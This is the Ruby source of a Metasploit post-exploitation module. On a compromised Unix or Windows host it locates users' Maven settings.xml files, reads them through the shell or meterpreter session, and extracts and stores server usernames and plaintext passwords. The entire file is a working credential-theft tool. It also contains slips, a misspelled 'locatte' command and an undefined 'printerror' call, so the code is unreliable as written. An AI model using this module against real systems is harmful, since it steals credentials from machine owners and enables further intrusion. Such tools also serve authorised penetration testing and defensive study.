
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather Maven Credentials Collection',
      'Description'    => %q{
          This module will collect the contents of all users settings.xml on the targeted
          machine.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['elenoir'],
      'Platform'       => %w{ bsd linux osx unix },
      'SessionTypes'   => ['shell','meterpreter']
    ))
  end

  def gathernix
    print_status("Unix OS detected")
    files = cmd_exec('locatte settings.xml').split("\n")
    # Handle case where locate does not exist (error is returned in first element)
    if files.length == 1 && !directory?(files.first)
      files = []
      paths = enum_user_directories.map {|d| d}
      if paths.nil? || paths.empty?
        print_error("No users directory found")
        return
      end
      paths.each do |path|
        path.chomp!
        file = "settings.xml"
        target = "#{path}/#{file}"
        if file? target
          files.push(target)
        end
      end
    end
    return files
  end

  def gatherwin
    print_status("Windows OS detected")
    return cmd_exec('cd\ && dir settings.xml /b /s').split("\n")
  end

  def run
    print_status("Finding user directories")
    files = ""
    if sysinfo
      if sysinfo['OS'].include? "Windows"
        files = gatherwin
      else
        files = gathernix
      end
    else
       printerror("Incompatible session type, sysinfo is not available.")
       return
    end
    if files.nil? || files.empty?
      print_error("No settings.xml file found")
      return
    end
    download_loot(files)
  end

  def download_loot(files)
    print_status("Looting #{files.count} files")
    files.each do |target|
      target.chomp!
      if file? target
        print_status("Downloading #{target}")
        extract(target)
      end
    end
  end

  def parse_settings(target, data)
    doc = REXML::Document.new(data).root

    doc.elements.each("servers/server") do |sub|
      id = sub.elements['id'].text rescue "<unknown>"
      username = sub.elements['username'].text rescue "<unknown>"
      password = sub.elements['password'].text rescue "<unknown>"

      print_status("Collected the following credentials:")
      print_status("    Id: %s" % id)
      print_status("    Username: %s" % username)
      print_status("    Password: %s" % password)
      loot_path = store_loot("maven.credentials", "text/plain", session, "#{username} #{password}",
          "settings.xml", "Maven credentials from #{target} and id #{id}")
      print_good("Saved credentials to #{loot_path}")
      print_line("")
    end
  end

  def extract(target)
      print_status("Reading settings.xml file from #{target}")
      data = ""
      if session.type == "shell"
        type = :shell
        data = session.shell_command("cat #{target}")
      else
        type = :meterp
        settings = session.fs.file.new("#{target}", "rb")
        until settings.eof?
          data << settings.read
        end
      end

      parse_settings(target, data)
  end
end
